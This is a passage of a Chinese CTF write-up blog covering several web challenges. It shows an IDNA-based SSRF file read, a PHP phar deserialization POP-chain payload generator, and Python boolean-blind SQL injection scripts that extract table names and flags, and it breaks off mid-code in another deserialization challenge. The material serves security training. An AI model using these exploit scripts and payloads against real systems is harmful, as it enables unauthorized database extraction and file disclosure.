class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"我扌 your problem? 222 "</span> <span class="token operator">+</span> host    newhost <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> h <span class="token keyword">in</span> host<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        newhost<span class="token punctuation">.</span>append<span class="token punctuation">(</span>h<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'idna'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    parts<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'.'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>newhost<span class="token punctuation">)</span>    <span class="token comment">#去掉 url 中的空格</span>    finalUrl <span class="token operator">=</span> urlunsplit<span class="token punctuation">(</span>parts<span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    host <span class="token operator">=</span> parse<span class="token punctuation">.</span>urlparse<span class="token punctuation">(</span>finalUrl<span class="token punctuation">)</span><span class="token punctuation">.</span>hostname    <span class="token keyword">if</span> host <span class="token operator">==</span> <span class="token string">'suctf.cc'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>finalUrl<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"我扌 your problem? 333"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>显然是要设法访问<code>suctf.cc</code>,<br>注意到意义不明的<code>newhost.append(h.encode(&#39;idna&#39;).decode(&#39;utf-8&#39;))</code>，<br>先用<code>idna</code>编码又用<code>utf-8</code>解码，嗯，耐人寻味，查了下<code>idna</code>编码，<br>发现就有现成的字符<code>℆</code>，<del>大概是师傅们都是从这题了解的</del>,<br>但是这样的话，只能得到<code>suctf.cc/u*</code>下的文件，遇事不决，先把能看的都看看，<br>在看配置文件时候<code>file://suctf.c℆sr/local/nginx/conf/nginx.conf</code></p><p>回显</p><blockquote><p>server { listen 80; location / { try_files $uri @app; } location @app { include uwsgi_params; uwsgi_pass unix:///tmp/uwsgi.sock; } location /static { alias /app/static; } # location /flag { # alias /usr/fffffflag; # } }</p></blockquote><p>很显然了，<code>file://suctf.c℆sr/fffffflag</code>，得到<code>flag</code></p><h1 id="lt-SWPUCTF-2018-gt-SimplePHP"><a href="#lt-SWPUCTF-2018-gt-SimplePHP" class="headerlink" title="&lt;SWPUCTF 2018&gt;SimplePHP"></a>&lt;SWPUCTF 2018&gt;SimplePHP</h1><p>打开题目，文件上传，但查看文件功能有漏洞，控制url可以查看服务端代码</p><p>查看代码可以发现并不存在文件上传漏洞，反而是<code>file.php?file=</code>这个参数大有可为</p><p><code>file.php</code>中部分代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">include</span> <span class="token string single-quoted-string">'class.php'</span><span class="token punctuation">;</span> <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'open_basedir'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'/var/www/html/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span> <span class="token operator">?</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;h2>There is no file to show!&lt;h2/>"</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token variable">$show</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token variable">$show</span><span class="token operator">-></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>     <span class="token variable">$show</span><span class="token operator">-></span><span class="token function">_show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>class.php</code>代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">C1e4r</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">str</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">test</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">str</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">test</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Show</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>   <span class="token comment">//$this->source = phar://phar.jpg</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">str</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">]</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__set</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span><span class="token variable">$value</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">_show</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/http|https|file:|gopher|dict|\.\.|f1ag/i'</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/http|https|file:|gopher|dict|\.\./i"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker~"</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$params</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">params</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">params</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">params</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">file_get</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">file_get</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$text</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$text</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><del>看到<code>file_get_contents</code>和<code>phar</code>还不明白吗</del><br>显然是<code>phar</code>反序列化</p><p>构造</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">C1e4r</span><span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Show</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span><span class="token punctuation">&#123;</span>     <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>     <span class="token keyword">public</span> <span class="token variable">$params</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"source"</span><span class="token operator">=></span><span class="token string double-quoted-string">"var/www/html/f1ag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">C1e4r</span><span class="token punctuation">;</span>    <span class="token variable">$a</span><span class="token operator">-></span><span class="token property">str</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">;</span>    <span class="token variable">$a</span><span class="token operator">-></span><span class="token property">str</span><span class="token operator">-></span><span class="token property">str</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"str"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">;</span>    <span class="token variable">$b</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"w.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$b</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$b</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$b</span><span class="token operator">-></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$b</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"a"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$b</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">copy</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"w.phar"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"a.png"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>直接访问<code>/upload</code>得到上传文件名<br>利用<code>phar</code>协议查看即可</p><h1 id="lt-WUSTCTF2020-gt-颜值成绩查询"><a href="#lt-WUSTCTF2020-gt-颜值成绩查询" class="headerlink" title="&lt;WUSTCTF2020&gt;颜值成绩查询"></a>&lt;WUSTCTF2020&gt;颜值成绩查询</h1><p>常规布尔盲注，甚至没有什么过滤</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requeststar_url<span class="token operator">=</span><span class="token string">"..............."</span>par<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"stunum"</span><span class="token punctuation">:</span><span class="token string">""</span><span class="token punctuation">&#125;</span>an<span class="token operator">=</span><span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">>"</span></span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> w <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">33</span><span class="token punctuation">,</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment">#par["stunum"]=f"0^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),&#123;i&#125;,1))=&#123;w&#125;)"</span>        <span class="token comment">#par["stunum"]=f"0^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='flag')),&#123;i&#125;,1))=&#123;w&#125;)"</span>        <span class="token comment">#par["stunum"]=f"0^(ascii(substr((select(group_concat(value))from(flag)),&#123;i&#125;,1))=&#123;w&#125;)"</span>        response<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>tar_url<span class="token punctuation">,</span>params<span class="token operator">=</span>par<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">100</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">"admin"</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            an<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>w<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>an<span class="token punctuation">)</span>            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="lt-GYCTF2020-gt-Ezsqli"><a href="#lt-GYCTF2020-gt-Ezsqli" class="headerlink" title="&lt;GYCTF2020&gt;Ezsqli"></a>&lt;GYCTF2020&gt;Ezsqli</h1><p>打开题目，显然是SQL注入</p><p>测试为数字型注入，测试过滤的关键字，可用布尔盲注，脚本如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requeststar_url<span class="token operator">=</span><span class="token string">"http://7772275b-dfab-48c8-99c0-5bbf6c3f97c2.node4.buuoj.cn:81/index.php"</span>get_data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"id"</span><span class="token punctuation">:</span><span class="token string">""</span><span class="token punctuation">&#125;</span>query_table<span class="token operator">=</span><span class="token string">"sys.schema_table_statistics"</span>query_column_1<span class="token operator">=</span><span class="token string">"table_name"</span>query_column_2<span class="token operator">=</span><span class="token string">"table_schema"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> w <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        get_data<span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"0^(ascii(substr((select group_concat(</span><span class="token interpolation"><span class="token punctuation">&#123;</span>query_column_1<span class="token punctuation">&#125;</span></span><span class="token string">) from </span><span class="token interpolation"><span class="token punctuation">&#123;</span>query_table<span class="token punctuation">&#125;</span></span><span class="token string"> where </span><span class="token interpolation"><span class="token punctuation">&#123;</span>query_column_2<span class="token punctuation">&#125;</span></span><span class="token string">=database()),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>w<span class="token punctuation">&#125;</span></span><span class="token string">)"</span></span>        repo<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>tar_url<span class="token punctuation">,</span>data<span class="token operator">=</span>get_data<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">"Nu1L"</span> <span class="token keyword">in</span> repo<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>w<span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><del>这个脚本还是挺慢的，但懒得写二分，趁着跑脚本划水也挺好的</del><br>得到表名</p><blockquote><p>users233333333333333,f1ag_1s_h3r3_hhhhh</p></blockquote><p><code>union</code>被过滤了，采用逐个对比的方法查字段数，</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">id=0^((select 1,2)>(select * from f1ag_1s_h3r3_hhhhh))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>回显<code>Nu1L</code>，说明字段数为2<br>尝试逐个读取，但<code>limit</code>被过滤了，好在只有一行数据</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requeststar_url<span class="token operator">=</span><span class="token string">"http://7772275b-dfab-48c8-99c0-5bbf6c3f97c2.node4.buuoj.cn:81/index.php"</span>get_data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"id"</span><span class="token punctuation">:</span><span class="token string">""</span><span class="token punctuation">&#125;</span>answer<span class="token operator">=</span><span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> w <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        suffix<span class="token operator">=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>w<span class="token punctuation">)</span>        get_data<span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"0^((select '</span><span class="token interpolation"><span class="token punctuation">&#123;</span>answer<span class="token punctuation">&#125;</span></span><span class="token interpolation"><span class="token punctuation">&#123;</span>suffix<span class="token punctuation">&#125;</span></span><span class="token string">',1)>(select * from f1ag_1s_h3r3_hhhhh))"</span></span>        repo<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>tar_url<span class="token punctuation">,</span>data<span class="token operator">=</span>get_data<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">"Nu1L"</span> <span class="token keyword">in</span> repo<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            answer<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>w<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>answer<span class="token punctuation">)</span>            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结果爆出一堆零，读取第二列，得到flag</p><h1 id="lt-MRCTF2020-gt-Ezpop"><a href="#lt-MRCTF2020-gt-Ezpop" class="headerlink" title="&lt;MRCTF2020&gt;Ezpop"></a>&lt;MRCTF2020&gt;Ezpop</h1><p>常规的代码审计</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">Welcome to index.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//flag is in flag.php</span><span class="token comment">//WTF IS THIS?</span><span class="token comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span><span class="token comment">//And Crack It!</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Modifier</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span>  <span class="token variable">$var</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">append</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">append</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">var</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Show</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Welcome to '</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">str</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string 